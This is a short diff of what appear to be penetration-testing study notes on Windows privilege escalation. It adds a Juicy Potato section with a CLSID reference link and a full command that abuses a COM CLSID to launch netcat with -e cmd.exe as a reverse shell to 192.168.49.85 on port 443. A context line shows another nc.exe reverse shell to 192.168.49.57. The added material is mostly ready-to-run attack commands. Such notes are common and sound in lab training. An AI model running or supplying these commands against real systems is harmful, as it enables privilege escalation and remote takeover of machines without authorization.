@@ -71,7 +71,11 @@ Z:\nc.exe 192.168.49.57 80 -e cmd.exe
 ```
 
 # Juicy Potato
+We can use one of the BITS CSLIDs from here:
 https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise
+```
+juicy.potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe 192.168.49.85 443" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
+```
 
 ## Binary Hijacking
 
